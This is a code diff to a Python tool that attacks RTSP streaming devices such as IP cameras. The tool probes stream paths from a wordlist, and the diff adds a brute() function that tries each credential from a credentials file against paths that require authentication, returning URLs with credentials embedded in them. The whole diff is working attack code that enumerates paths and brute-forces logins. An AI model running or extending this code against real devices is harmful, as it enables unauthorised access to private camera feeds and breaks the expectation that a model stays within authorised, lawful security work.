@@ -27,39 +27,40 @@ paths = [FAKE_PATH] + [ln.rstrip() for ln in open(PATHS_FILE)]
 creds = [ln.rstrip() for ln in open(CREDS_FILE)]
 
 
+def brute(connection: RTSPConnection, path: str):
+    for cred in creds:
+        response = connection.auth(path, cred)
+
+        if response.error:
+            break
+
+        if response.found:
+            return connection.url(path, cred)
+
+
 def attack(connection: RTSPConnection, single_path: bool = True):
     results = []
+
     for path in paths:
-        r = connection.get(path)
+        response = connection.get(path)
 
-        if r.code >= 500:
-            return results
+        if response.error:
+            break
 
-        if r.code == 200:
-            url = connection.url('/' if path == FAKE_PATH else path)
-            results.append(url)
+        if response.found:
+            if path == FAKE_PATH:
+                path = '/'
 
-            if single_path:
-                return results
+            results.append(connection.url(path))
 
-        if r.code == 401 and path != FAKE_PATH:
-            # bruteforcing creds
-            for cred in creds:
-                r = connection.auth(path, cred)
+        if response.auth_needed and path != FAKE_PATH:
+            result = brute(connection, path)
 
-                if r.code >= 500:
-                    return results
+            if result:
+                results.append(result)
 
-                if r.code == 200:
-                    results.append(connection.url(path, cred))
-                    if single_path:
-                        return results
-                    break  # one cred per path is enough
-
-            # if no one cred accepted,
-            # we have no cred for another paths i think
-            if not results:
-                break
+        if single_path and results:
+            break
 
     return results
 
@@ -68,7 +69,7 @@ def process_target(target_params: tuple[str, int, bool, str]) -> list[str]:
     host, port, single_path, interface = target_params
 
     with RTSPConnection(host, port, interface) as connection:
-        if connection.query().code == 200:
+        if connection.query().ok:
             return attack(connection, single_path)
 
         return []
